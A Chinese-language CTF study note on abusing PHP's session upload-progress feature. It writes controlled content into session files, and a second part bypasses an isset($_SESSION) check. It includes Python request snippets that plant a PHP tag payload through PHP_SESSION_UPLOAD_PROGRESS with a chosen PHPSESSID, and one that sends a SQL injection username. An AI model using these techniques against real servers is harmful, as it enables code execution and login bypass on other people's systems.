tags:: CTF/PHP/文件上传, CTF/RCE

- # 利用session向文件中写入文件
	- php session 的 ID 是可以在 cookie 中自定义的
	- session 位置一般是`/tmp/`或者`/var/lib/php/sessions`
	- session 文件名为 sess_xxxxx, xxxxx 就是自定义的 session ID
	- 而且，在上传文件时，文件的上传状态会保存在 session 文件中。
	- 而文件的上传状态也是可以控制的
	- 所以这样就可以上传恶意文件
		- ```python
		  requests.post(
		  "http://124.71.162.7:10882/",
		  data={
		      "PHP_SESSION_UPLOAD_PROGRESS": "<?php echo 123123;?>"
		  },
		  files={"file":('a.txt', io.BytesIO(b'a' * 1024 * 50))},
		  cookies={"PHPSESSID": "test"}
		  )
		  ```
	- 文件名在上面
- # 绕过isset($_SESSION)
	- 利用`isset($_SESSION)`来阻止访问template文件是不安全的。
	- 如果`php.ini`中开启了`session.upload_progress.enabled`，那么用户可以通过`PHP_SESSION_UPLOAD_PROGRESS`让PHP自动开启session
		- ```python
		  r = base_post(f"{url}/templates/login.php", params = {
		      "p": "login",
		      "username": 'bbb"||1#',
		      "password": "b"
		  }, data = {
		      "PHP_SESSION_UPLOAD_PROGRESS": "123456789"
		  }, files = {
		      "file": ("a", "a")
		  })
		  print(r.text)
		  ```
	- 示例：[[CTF/WP/BUUCTF/PwnThyBytes 2019 Baby_SQL]]
- # 伪造session
	- [[CTF/WP/BUUCTF/HFCTF2020 BabyUpload]]